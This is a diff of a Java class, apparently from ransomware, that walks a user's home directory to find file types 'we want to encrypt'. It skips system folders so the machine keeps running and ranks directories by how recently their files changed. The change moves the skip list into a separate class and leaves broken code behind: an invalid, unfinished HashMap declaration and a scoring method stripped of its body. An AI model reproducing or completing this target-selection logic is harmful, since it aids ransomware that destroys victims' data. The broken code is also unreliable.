@@ -35,8 +35,9 @@ public class FindFiles {
 
     //List of filetypes we want to encrypt
     List<String> allowedFiles;
+    List<String> avoidDir;
     HashMap<String, Integer> directoryScore = new HashMap<>();
-    HashMap<String, Integer> directoryFileCount = new HashMap<>();
+    HashMap<String, HashMap<long, >>
 
 
     public void FindFiles() throws Exception {
@@ -54,6 +55,7 @@ public class FindFiles {
         //List of allowed files
 
         allowedFiles = new FileTypes().AllowedTypes;
+        avoidDir = new AvoidedDir().avoidDir;
 
         //Traverse the file system
         traverse(home);
@@ -69,7 +71,8 @@ public class FindFiles {
         for(File f: list) {
             if (f.isDirectory()) {
                 String name = f.getName();
-                if (name.equals("Windows") || name.equals("ProgramData") || name.equals("ProgramFiles") || name.equals("Boot") || name.equals("Library")) return; //want system to still work
+                if (avoidDir.contains(name.toLowerCase())) return; //want system to still work
+
                 traverse(f.getAbsolutePath());
 
             } else {
@@ -113,19 +116,7 @@ public class FindFiles {
         Date last3Months = new Date(currentTimeMillis - TimeUnit.DAYS.toMillis(90)); //last 3 months
 
 
-        if(lastMod.after(date)) {
-            return 256;
-        } if(lastMod.after(lastWeek)) {
-            return 64;
-        } if(lastMod.after(twoWeeks)) {
-            return 16;
-        } if(lastMod.after(lastMonth)) {
-            return 8;
-        } if (lastMod.after(last3Months)) {
-            return 2;
-        }
 
-        return 0;
     }
 
     public void hashToFile() throws Exception {
